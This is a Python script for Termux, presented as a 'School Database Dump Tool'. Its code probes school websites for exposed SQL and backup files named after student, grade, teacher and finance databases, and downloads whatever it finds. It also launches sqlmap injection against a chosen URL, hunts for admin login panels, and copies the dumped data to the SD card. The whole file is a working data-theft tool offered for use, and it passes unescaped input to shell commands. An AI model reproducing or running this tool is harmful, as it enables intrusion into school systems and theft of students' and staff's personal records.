#!/data/data/com.termux/files/usr/bin/python3
import os
import sys
import requests
import subprocess
from datetime import datetime

os.system('clear')

class SchoolDump:
    def __init__(self):
        self.temp_dir = "/data/data/com.termux/files/home/.school_dump"
        os.system(f"mkdir -p {self.temp_dir}")
        
    def banner(self):
        print("""\033[1;91m

        ╔═══╗╔╗─╔╗╔═══╗╔═══╗╔═══╗
        ║╔══╝║║─║║║╔══╝║╔═╗║║╔══╝
        ║╚══╗║║─║║║╚══╗║╚═╝║║╚══╗
        ║╔══╝║║─║║║╔══╝║╔╗╔╝║╔══╝
        ║╚══╗║╚═╝║║╚══╗║║║╚╗║╚══╗
        ╚═══╝╚═══╝╚═══╝╚╝╚═╝╚═══╝

        ╔═══╗╔╗╔╗╔═══╗╔╗──╔╗╔═══╗╔═══╗
        ║╔══╝║║║║║╔══╝║║──║║║╔══╝║╔═╗║
        ║╚══╗║║║║║╚══╗║║──║║║╚══╗║╚═╝║
        ║╔══╝║║║║║╔══╝║║──║║║╔══╝║╔╗╔╝
        ║╚══╗║╚╝║║╚══╗║╚═╗║╚╝║───║║║╚╗
        ╚═══╝╚══╝╚═══╝╚══╝╚══╝───╚╝╚═╝
        
        \033[1;93m    SCHOOL DATABASE DUMP TOOL - TERMUX
        \033[1;92m       Author: @Deat-Evil-bit
        \033[0m
        """)
    
    def main_menu(self):
        while True:
            self.banner()
            print("\033[1;96m" + "═"*50 + "\033[0m")
            print("\033[1;95m[1] Scan School Website")
            print("[2] Find Database Files")
            print("[3] SQL Injection Test")
            print("[4] Admin Panel Finder")
            print("[5] Backup File Scanner")
            print("[6] Export Data")
            print("[7] Exit\033[0m")
            print("\033[1;96m" + "═"*50 + "\033[0m")
            
            choice = input("\n\033[1;93m[+] Choose: \033[0m")
            
            if choice == "1":
                self.scan_school()
            elif choice == "2":
                self.find_database()
            elif choice == "3":
                self.sql_test()
            elif choice == "4":
                self.admin_finder()
            elif choice == "5":
                self.backup_scanner()
            elif choice == "6":
                self.export_data()
            elif choice == "7":
                self.exit_tool()
            else:
                continue
    
    def scan_school(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ SCHOOL WEBSITE SCANNER ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        url = input("\033[1;93m[+] School Website URL: \033[0m").strip()
        if not url.startswith("http"):
            url = "http://" + url
        
        print(f"\n\033[1;92m[+] Scanning: {url}\033[0m")
        
        # Common school database paths
        db_paths = [
            "/database/", "/db/", "/data/", "/backup/",
            "/sql/", "/mysql/", "/phpmyadmin/",
            "/admin/db/", "/school/data/", "/siswa/db/",
            "/nilai/database/", "/e-learning/db/",
            "/db_school/", "/database_siswa/",
            "/backup_db/", "/db_backup/"
        ]
        
        # Common database files
        db_files = [
            "database.sql", "db.sql", "backup.sql",
            "school.sql", "siswa.sql", "nilai.sql",
            "data.sql", "mysql.sql", "dump.sql",
            "backup.db", "school.db", "data.db",
            "database.db", "siswa.db", "nilai.db",
            ".sql", ".db", ".bak", ".backup"
        ]
        
        found = []
        
        print("\n\033[1;92m[+] Checking database directories...\033[0m")
        for path in db_paths:
            test_url = url + path
            try:
                r = requests.get(test_url, timeout=5)
                if r.status_code == 200:
                    print(f"\033[1;92m[✓] Found: {test_url}\033[0m")
                    found.append(test_url)
            except:
                pass
        
        print("\n\033[1;92m[+] Checking common database files...\033[0m")
        for file in db_files:
            test_urls = [
                url + "/" + file,
                url + "/database/" + file,
                url + "/db/" + file,
                url + "/backup/" + file
            ]
            for test_url in test_urls:
                try:
                    r = requests.get(test_url, timeout=5)
                    if r.status_code == 200 and len(r.content) > 100:
                        print(f"\033[1;92m[✓] Found DB file: {test_url}\033[0m")
                        found.append(test_url)
                except:
                    pass
        
        if found:
            save = input("\n\033[1;93m[+] Save results? (y/n): \033[0m")
            if save.lower() == 'y':
                with open(f"{self.temp_dir}/scan_results.txt", "w") as f:
                    for item in found:
                        f.write(item + "\n")
                print(f"\033[1;92m[+] Saved to: {self.temp_dir}/scan_results.txt\033[0m")
        else:
            print("\033[1;91m[-] No database files found\033[0m")
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def find_database(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ DATABASE FILE FINDER ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        url = input("\033[1;93m[+] Target URL: \033[0m").strip()
        if not url.startswith("http"):
            url = "http://" + url
        
        print("\n\033[1;92m[+] Searching for database files...\033[0m")
        
        # School specific database names
        school_dbs = [
            "db_sekolah", "database_sekolah", "siswa_db",
            "guru_db", "nilai_db", "absensi_db",
            "pembayaran_db", "perpustakaan_db", "inventaris_db",
            "e_learning_db", "ujian_db", "rapor_db",
            "alumni_db", "pegawai_db", "keuangan_db",
            "akademik_db", "data_siswa", "data_guru"
        ]
        
        extensions = [".sql", ".db", ".sqlite", ".sqlite3", ".bak", ".backup", ".dump"]
        
        found_files = []
        
        for db_name in school_dbs:
            for ext in extensions:
                test_urls = [
                    f"{url}/{db_name}{ext}",
                    f"{url}/database/{db_name}{ext}",
                    f"{url}/db/{db_name}{ext}",
                    f"{url}/backup/{db_name}{ext}",
                    f"{url}/data/{db_name}{ext}"
                ]
                
                for test_url in test_urls:
                    try:
                        r = requests.head(test_url, timeout=3)
                        if r.status_code == 200:
                            print(f"\033[1;92m[✓] Found: {test_url}\033[0m")
                            found_files.append(test_url)
                    except:
                        pass
        
        # Download found files
        if found_files:
            print(f"\n\033[1;92m[+] Found {len(found_files)} database files\033[0m")
            for i, file_url in enumerate(found_files, 1):
                try:
                    r = requests.get(file_url, timeout=10)
                    if r.status_code == 200:
                        filename = file_url.split("/")[-1]
                        with open(f"{self.temp_dir}/{filename}", "wb") as f:
                            f.write(r.content)
                        print(f"\033[1;92m[+] Downloaded: {filename}\033[0m")
                except:
                    pass
        else:
            print("\033[1;91m[-] No database files found\033[0m")
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def sql_test(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ SQL INJECTION TEST ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        print("\033[1;93m[+] This requires sqlmap to be installed")
        print("[+] Install with: pkg install sqlmap\033[0m\n")
        
        url = input("\033[1;93m[+] Target URL with parameter: \033[0m").strip()
        
        if not url:
            print("\033[1;91m[-] No URL provided\033[0m")
            input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
            return
        
        # Check if sqlmap is installed
        if os.system("which sqlmap > /dev/null 2>&1") != 0:
            print("\033[1;91m[-] sqlmap not installed. Install with: pkg install sqlmap\033[0m")
        else:
            print(f"\n\033[1;92m[+] Running sqlmap on: {url}\033[0m")
            print("\033[1;92m[+] This may take several minutes...\033[0m")
            
            cmd = f"sqlmap -u '{url}' --batch --random-agent"
            os.system(cmd)
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def admin_finder(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ SCHOOL ADMIN PANEL FINDER ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        url = input("\033[1;93m[+] School Website: \033[0m").strip()
        if not url.startswith("http"):
            url = "http://" + url
        
        print("\n\033[1;92m[+] Searching admin panels...\033[0m")
        
        # School specific admin paths
        admin_paths = [
            "/admin", "/administrator", "/login", "/panel",
            "/admin_login", "/adminpanel", "/wp-admin",
            "/admincp", "/controlpanel", "/moderator",
            "/user/login", "/siswa/login", "/guru/login",
            "/nilai/admin", "/sekolah/admin", "/e-learning/admin",
            "/dashboard", "/manage", "/backend", "/cpanel",
            "/admin/index.php", "/admin/login.php",
            "/admin/admin.php", "/admin/panel.php"
        ]
        
        found = []
        
        for path in admin_paths:
            test_url = url + path
            try:
                r = requests.get(test_url, timeout=3)
                if r.status_code == 200:
                    if any(keyword in r.text.lower() for keyword in ['login', 'password', 'username', 'admin']):
                        print(f"\033[1;92m[✓] Admin panel: {test_url}\033[0m")
                        found.append(test_url)
            except:
                pass
        
        if found:
            print(f"\n\033[1;92m[+] Found {len(found)} admin panels\033[0m")
        else:
            print("\033[1;91m[-] No admin panels found\033[0m")
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def backup_scanner(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ BACKUP FILE SCANNER ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        url = input("\033[1;93m[+] Target URL: \033[0m").strip()
        if not url.startswith("http"):
            url = "http://" + url
        
        print("\n\033[1;92m[+] Scanning for backup files...\033[0m")
        
        backup_files = [
            "backup.sql", "database_backup.sql", "school_backup.sql",
            "backup.zip", "database.zip", "backup.rar",
            "dump.sql", "full_backup.sql", "mysql_backup.sql",
            "backup.tar.gz", "db_backup.sql", "site_backup.sql",
            "backup_2023.sql", "backup_2024.sql", "backup_latest.sql",
            "backup.php", "backup.txt", "backup.log"
        ]
        
        found = []
        
        for file in backup_files:
            test_urls = [
                f"{url}/{file}",
                f"{url}/backup/{file}",
                f"{url}/database/{file}",
                f"{url}/db/{file}",
                f"{url}/admin/{file}"
            ]
            
            for test_url in test_urls:
                try:
                    r = requests.head(test_url, timeout=3)
                    if r.status_code == 200:
                        print(f"\033[1;92m[✓] Backup found: {test_url}\033[0m")
                        found.append(test_url)
                except:
                    pass
        
        if found:
            for backup_url in found:
                try:
                    r = requests.get(backup_url, timeout=10)
                    if r.status_code == 200:
                        filename = backup_url.split("/")[-1]
                        with open(f"{self.temp_dir}/{filename}", "wb") as f:
                            f.write(r.content)
                        print(f"\033[1;92m[+] Downloaded: {filename}\033[0m")
                except:
                    pass
        else:
            print("\033[1;91m[-] No backup files found\033[0m")
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def export_data(self):
        self.banner()
        print("\033[1;95m" + "═"*50 + "\033[0m")
        print("\033[1;92m[ EXPORT DATA ]\033[0m")
        print("\033[1;95m" + "═"*50 + "\033[0m\n")
        
        print("\033[1;92m[+] Downloaded files:\033[0m")
        
        if os.path.exists(self.temp_dir):
            files = os.listdir(self.temp_dir)
            if files:
                for file in files:
                    size = os.path.getsize(f"{self.temp_dir}/{file}")
                    print(f"\033[1;92m[+] {file} ({size} bytes)\033[0m")
                
                print("\n\033[1;93m[1] Copy to SD Card")
                print("[2] View file contents")
                print("[3] Delete all files")
                print("[4] Back\033[0m")
                
                choice = input("\n\033[1;93m[+] Choose: \033[0m")
                
                if choice == "1":
                    os.system(f"cp -r {self.temp_dir}/* /sdcard/ 2>/dev/null")
                    print("\033[1;92m[+] Files copied to SD Card\033[0m")
                elif choice == "2":
                    file = input("\033[1;93m[+] File name: \033[0m")
                    if os.path.exists(f"{self.temp_dir}/{file}"):
                        os.system(f"cat {self.temp_dir}/{file} | head -50")
                elif choice == "3":
                    os.system(f"rm -rf {self.temp_dir}/*")
                    print("\033[1;92m[+] All files deleted\033[0m")
            else:
                print("\033[1;91m[-] No files found\033[0m")
        else:
            print("\033[1;91m[-] No data to export\033[0m")
        
        input("\n\033[1;93m[+] Press Enter to continue...\033[0m")
    
    def exit_tool(self):
        print("\n\033[1;92m[+] Cleaning up...\033[0m")
        print("\033[1;92m[+] Tool closed\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    try:
        tool = SchoolDump()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\n\033[1;91m[!] Interrupted\033[0m")
        sys.exit(0)
